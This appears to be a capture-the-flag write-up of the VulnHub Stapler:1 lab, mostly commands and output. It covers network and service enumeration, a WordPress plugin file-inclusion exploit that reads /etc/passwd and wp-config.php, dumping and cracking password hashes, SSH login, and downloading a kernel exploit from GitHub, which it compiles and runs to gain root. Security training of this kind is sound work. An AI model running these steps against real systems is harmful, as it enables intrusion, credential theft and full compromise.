@@ -1,0 +1,276 @@
+Reconnaissance
+Started with netdiscover to find the target on the network.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ sudo netdiscover -r 192.168.1.0/24
+
+Currently scanning: 192.168.1.0/24 | Screen View: Unique Hosts
+
+4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+-----------------------------------------------------------------------------
+192.168.1.1     00:11:22:33:44:55  1         60   NETGEAR
+192.168.1.102   08:00:27:40:7c:f7  3        180   PCS Systemtechnik GmbH
+Target at 192.168.1.102. MAC 08:00:27 confirms it's a VirtualBox VM .
+
+Full port scan to see what services are running.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ sudo nmap -sS -sV -p- -A 192.168.1.102
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2026-08-26 15:12 WAT
+Nmap scan report for 192.168.1.102
+Host is up (0.00038s latency).
+Not shown: 65523 filtered ports
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 3.0.3
+22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+53/tcp    open  domain      dnsmasq 2.75
+80/tcp    open  http        PHP cli server 5.5+
+139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
+666/tcp   open  doom?       (unknown service)
+3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
+12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+MAC Address: 08:00:27:40:7C:F7 (Oracle VirtualBox)
+
+Nmap done: 1 IP address (1 host up) scanned in 142.61 seconds
+Lot of open ports: FTP, SSH, DNS, HTTP, SMB, some unknown service on 666, MySQL, and Apache on 12380 .
+
+Enumeration
+Started with FTP since it allows anonymous login .
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ ftp 192.168.1.102
+Connected to 192.168.1.102.
+220-| Harry, make sure to update the banner when you get a chance to show who has access here
+Name (192.168.1.102:kindgod): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             107 Jun 03  2016 note
+226 Directory send OK.
+ftp> get note
+local: note remote: note
+150 Opening BINARY mode data connection for note (107 bytes).
+226 Transfer complete.
+107 bytes received in 0.00 secs (98.362 kB/s)
+ftp> exit
+Downloaded note and checked the contents.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ cat note
+Elly, make sure you update the payload information. Once you're done, leave it in your FTP account for John.
+Got two usernames: Elly and John. Good start .
+
+Next, enumerated SMB .
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ enum4linux -a 192.168.1.102
+
+[+] Enumerating users using SID S-1-22-1 and logon username='', password=''
+S-1-22-1-1000 Unix User\fred (Local User)
+S-1-22-1-1001 Unix User\kathy (Local User)
+S-1-22-1-1002 Unix User\peter (Local User)
+S-1-22-1-1003 Unix User\SHayslett (Local User)
+S-1-22-1-1004 Unix User\Zoe (Local User)
+
+[+] Share Enumeration on 192.168.1.102
+Sharename       Type      Comment
+---------       ----      -------
+kathy           Disk      
+tmp             Disk      
+IPC$            IPC       IPC Service (fred server (Samba, Ubuntu))
+Found more users: fred, kathy, peter, SHayslett, Zoe. Also found shares: kathy and tmp .
+
+Connected to the kathy share.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ smbclient //192.168.1.102/kathy -N
+smb: \> ls
+  .                                   D        0  Tue Jun  7 03:08:39 2016
+  ..                                  D        0  Tue Jun  7 03:08:39 2016
+  kathy_stuff                         D        0  Mon Jun  6 15:40:15 2016
+  backup                              D        0  Tue Jun  7 02:22:08 2016
+smb: \> cd kathy_stuff
+smb: \kathy_stuff\> ls
+  .                                   D        0  Mon Jun  6 15:40:15 2016
+  ..                                  D        0  Mon Jun  6 15:40:15 2016
+  todo-list.txt                       N       18  Sun Jun  5 19:21:19 2016
+smb: \kathy_stuff\> get todo-list.txt
+smb: \> cd backup
+smb: \backup\> ls
+  .                                   D        0  Tue Jun  7 02:22:08 2016
+  ..                                  D        0  Tue Jun  7 02:22:08 2016
+  vsftpd.conf                         N     5961  Sun Jun  5 18:41:23 2016
+  wordpress-4.tar.gz                  N  6321767  Sun Jun  5 18:38:27 2016
+smb: \backup\> get vsftpd.conf
+smb: \backup\> get wordpress-4.tar.gz
+Downloaded everything. Checked the todo-list.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ cat todo-list.txt
+I'm making sure to backup anything important for Initech, Kathy
+Found wordpress-4.tar.gz - a full WordPress backup .
+
+Now moved to the web server on port 12380.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ nikto -h https://192.168.1.102:12380
+
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.102
++ Target Hostname:    192.168.1.102
++ Target Port:        12380
++ Start Time:         2026-08-26 15:45:32
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ /blogblog/: Site appears to be WordPress 4.2.1
++ /phpmyadmin/: phpMyAdmin directory found
+Found /blogblog/ and /phpmyadmin/ .
+
+Visited https://192.168.1.102:12380/blogblog/. It's a WordPress site. Ran wpscan to enumerate users.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ wpscan --url https://192.168.1.102:12380/blogblog/ --enumerate u --disable-tls-checks
+
+[+] Enumerating Usernames ...
+[+] We found the following users:
+    | Username: john
+    | Username: peter
+    | Username: admin
+    | Username: zoe
+    | Username: fred
+Got more usernames from WordPress.
+
+Also found Advanced Video Plugin version 1.0 - vulnerable to Local File Inclusion .
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ searchsploit advanced video
+-------------------------------------------------------------------------------
+ Exploit Title                              |  Path
+-------------------------------------------------------------------------------
+WordPress Plugin Advanced Video 1.0 - Local File Inclusion | php/webapps/39646.py
+-------------------------------------------------------------------------------
+Used the exploit to read /etc/passwd.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ python3 39646.py
+[+] Target: https://192.168.1.102:12380/blogblog/
+[+] File: /etc/passwd
+[+] Output: https://192.168.1.102:12380/blogblog/wp-content/uploads/1234567890.jpeg
+Downloaded the file.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ wget --no-check-certificate https://192.168.1.102:12380/blogblog/wp-content/uploads/1234567890.jpeg
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ cat 1234567890.jpeg
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+Got the passwd file. Also used the LFI to read wp-config.php to get MySQL credentials .
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ python3 39646.py
+[+] Target: https://192.168.1.102:12380/blogblog/
+[+] File: ../wp-config.php
+[+] Output: https://192.168.1.102:12380/blogblog/wp-content/uploads/9876543210.jpeg
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ cat 9876543210.jpeg
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'root');
+define('DB_PASSWORD', 'plbkac');
+define('DB_HOST', 'localhost');
+MySQL credentials: root:plbkac .
+
+Logged into MySQL and extracted password hashes.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ mysql -h 192.168.1.102 -u root -pplbkac
+mysql> use wordpress;
+mysql> select user_login,user_pass from wp_users;
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| john       | $P$B8tMn7fhf79D7pO6F0Jw2ZQW5X1w9E/ |
+| peter      | $P$BdUVqHhR8x/nL8CN1BZGzD6e7O5HUP/ |
+| admin      | $P$BZBw1Xp6fDd5N0lF/1KL4K1q8VKlj/ |
+| zoe        | $P$B/sLg9V9S0D5N2hTnKV8p1VZ0pPn/ |
+| fred       | $P$B/6a4Q5W7sK1z2B/jvL1yH5b/vF/  |
++------------+------------------------------------+
+Cracked the hashes with john .
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+incorrect       (john)
+Got john:incorrect .
+
+Exploitation
+Used the credentials to SSH in.
+
+
+┌──(kindgod㉿kali)-[~/vulnhub/stapler]
+└─$ ssh john@192.168.1.102
+john@192.168.1.102's password: incorrect
+Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)
+john@red:~$ id
+uid=1002(john) gid=1002(john) groups=1002(john)
+Got a low-privilege shell as john.
+
+Privilege Escalation
+Checked the kernel version.
+
+
+john@red:~$ uname -a
+Linux red 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+john@red:~$ cat /etc/lsb-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
+Kernel 4.4.0-21-generic on Ubuntu 16.04 - vulnerable to CVE-2016-4557 .
+
+Transferred the exploit to the target.
+
+
+john@red:~$ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+john@red:~$ unzip 39772.zip
+john@red:~$ cd 39772/ebpf_mapfd_doubleput_exploit/
+john@red:~$ sh compile.sh
+john@red:~$ ./doubleput
+
+john@red:~$ id
+uid=0(root) gid=0(root) groups=0(root),1002(john)
+Root access achieved.
+
+Flag
+
+root@red:~# cd /root
+root@red:~# ls
+flag.txt
+root@red:~# cat flag.txt
+Congrats! You've rooted Stapler:1!
+Thanks for playing!
